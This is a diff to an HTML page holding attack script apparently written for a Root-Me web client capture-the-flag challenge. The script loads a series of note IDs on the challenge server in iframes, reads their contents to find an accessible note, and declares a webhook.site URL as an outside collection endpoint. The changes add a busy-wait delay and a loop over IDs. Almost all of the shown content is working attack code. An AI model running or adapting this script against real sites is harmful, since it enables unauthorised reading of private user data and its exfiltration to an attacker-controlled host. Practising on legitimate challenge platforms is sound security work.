@@ -7,6 +7,12 @@
     <script>
     const TARGET = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
     const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
+
+    function sleep(ms) {
+        const end = Date.now() + ms;
+        while (Date.now() < end) {}
+    }
+
     function tryId(i) {
         const iframe = document.createElement("iframe");
         iframe.onload = () => {
@@ -17,17 +23,22 @@
         };
         iframe.src = TARGET + i;
         document.body.appendChild(iframe);
-
+        sleep(1000);
         const doc = iframe.contentDocument;
         const text = doc.body.textContent.trim();
 
         if (!text.includes("not authorized")) {
             console.log("FOUND", i);
         }
+        else {
+            iframe.remove();
+        }
     }
 
-    tryId(2811);
-    tryId(2810);
+    for (let i = 2810; i < 2812; i++) {
+        tryId(i);
+    }
+
     </script>
 </body>
 
